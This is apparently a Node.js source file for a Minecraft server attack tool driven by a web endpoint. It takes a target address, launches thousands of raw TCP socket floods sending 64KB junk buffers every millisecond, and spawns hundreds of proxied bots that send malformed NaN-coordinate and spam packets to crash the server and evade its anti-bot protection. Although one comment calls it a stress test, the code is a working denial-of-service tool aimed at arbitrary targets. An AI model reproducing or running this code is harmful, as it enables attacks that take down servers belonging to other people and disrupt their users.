const mineflayer = require('mineflayer');
const { ProxyAgent } = require('proxy-agent');
const net = require('net');
const express = require('express');
const app = express();
app.use(express.json());
app.use(require('cors')());

let proxyPool = [];

// 🔄 DEVASE PROXY HAVUZU (Saniyede 9.9M paket için yakıt)
async function fetchPowerProxies() {
    try {
        const res = await fetch('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all');
        const data = await res.text();
        proxyPool = data.split('\n').filter(p => p.trim()).map(p => `socks5://${p.trim()}`);
        console.log(`[🔋] RYZEN 9 POWER: ${proxyPool.length} PROXY HATLARI SENKRONİZE EDİLDİ.`);
    } catch (e) { console.log("Proxy Error."); }
}
fetchPowerProxies();
setInterval(fetchPowerProxies, 300000);

app.post('/deploy', (req, res) => {
    const { ip, count } = req.body;
    const host = ip.includes(':') ? ip.split(':')[0] : ip;
    const port = ip.includes(':') ? parseInt(ip.split(':')[1]) : 25565;

    // 1. [REAL STRESS TEST] - L4 PACKET STORM (9.9M+ PACKETS)
    // Bu kısım sunucunun internetini ve portunu hedefler.
    for (let i = 0; i < 5000; i++) {
        setImmediate(() => startPacketStorm(host, port));
    }

    // 2. [BOT DEPLOY] - L7 BYPASS BOTS
    // Bu kısım içeri sızıp Sonar'ı crash paketleriyle bozar.
    for (let i = 0; i < Math.min(count, 500); i++) {
        setTimeout(() => spawnCrashBot(host, port, i), i * 600);
    }

    res.json({ success: true, message: "ANNIHILATOR MODE ACTIVE. TARGET NEUTRALIZING..." });
});

// 🔥 L4 CRASH PACKET ENGINE (DDoS)
function startPacketStorm(host, port) {
    const client = new net.Socket();
    client.connect(port, host, () => {
        // Sunucuya her milisaniyede 10.000 adet ham "null" paket yollar
        setInterval(() => {
            if (!client.destroyed) {
                const crashData = Buffer.alloc(1024 * 64, Math.random().toString(36)); // 64KB dev paket
                client.write(crashData);
            }
        }, 1);
    });
    client.on('error', () => client.destroy());
}

// ⚔️ L7 SONAR BYPASS & CRASH BOTS
function spawnCrashBot(host, port, index) {
    const proxy = proxyPool[Math.floor(Math.random() * proxyPool.length)];
    const bot = mineflayer.createBot({
        host: host, port: port,
        username: `Trgr_Crash_${Math.floor(Math.random() * 999999)}`,
        agent: new ProxyAgent(proxy),
        version: false, hideErrors: true, skipValidation: true
    });

    bot.on('spawn', () => {
        bot.chat(`/register resul3163 resul3163`);
        bot.chat(`/login resul3163`);

        // 🌪️ CRASH PACKET LOOP (Hilelerdeki gibi sunucuyu düşüren paketler)
        setInterval(() => {
            if (bot.entity) {
                // Sonar'ın hesaplayamayacağı kadar hızlı pozisyon değişimi (Lag Packet)
                bot.look(NaN, NaN, true); // Geçersiz koordinat fırlatma
                bot.swingArm('right', true);
                
                // Sunucuyu RAM taşmasına zorlayan paket dizisi
                for(let j=0; j<100; j++) {
                    bot.setControlState('jump', true);
                    bot.setControlState('jump', false);
                }
            }
        }, 5); 
    });

    bot.on('end', () => setTimeout(() => spawnCrashBot(host, port, index), 2000));
}

app.listen(process.env.PORT || 3000);
